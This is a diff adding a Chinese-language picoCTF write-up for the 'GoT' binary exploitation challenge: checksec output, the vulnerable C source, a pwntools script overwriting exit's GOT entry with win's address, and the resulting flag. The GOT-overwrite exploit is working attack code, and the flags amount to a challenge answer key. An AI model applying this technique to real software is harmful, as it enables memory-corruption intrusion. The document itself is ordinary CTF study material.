@@ -604,3 +604,64 @@ alpzllo hx pilyl zqx, qx u iqcl qnylqrs xqur xfmlzilyl, pil afor fv pil xlq. alx
 flag又不一樣 我的flag
 
 frequency_is_c_over_lambda_mupgpennod
+## GoT - Points: 350 - (Solves: 440)Binary Exploitation
+### code
+```
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+```
+部份可寫 經過測試 puts 不能寫 exit 可以寫
+```
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define FLAG_BUFFER 128
+
+void win() {
+  char buf[FLAG_BUFFER];
+  FILE *f = fopen("flag.txt","r");
+  fgets(buf,FLAG_BUFFER,f);
+  puts(buf);
+  fflush(stdout);
+}
+
+
+int *pointer;
+
+int main(int argc, char *argv[])
+{
+
+   puts("You can just overwrite an address, what can you do?\n");
+   puts("Input address\n");
+   scanf("%d",&pointer);
+   puts("Input value?\n");
+   scanf("%d",pointer);
+   puts("The following line should print the flag\n");
+   exit(0);
+}
+```
+```
+from pwn import *
+context.log_level='debug'
+r=process('./got')
+e=ELF('./got')
+puts_got=e.got['puts']
+exit_got=e.got['exit']
+win=e.symbols['win']
+# print(hex(win))
+# print(hex(exit_got))
+# print(type(hex(win)))
+r.sendlineafter('address\n',str(exit_got))
+r.sendlineafter('value?\n',str(win))
+
+r.recvall()
+# r.interactive()
+```
+不用p32 因為他是吃int
+
+picoCTF{A_s0ng_0f_1C3_and_f1r3_2a9d1eaf}
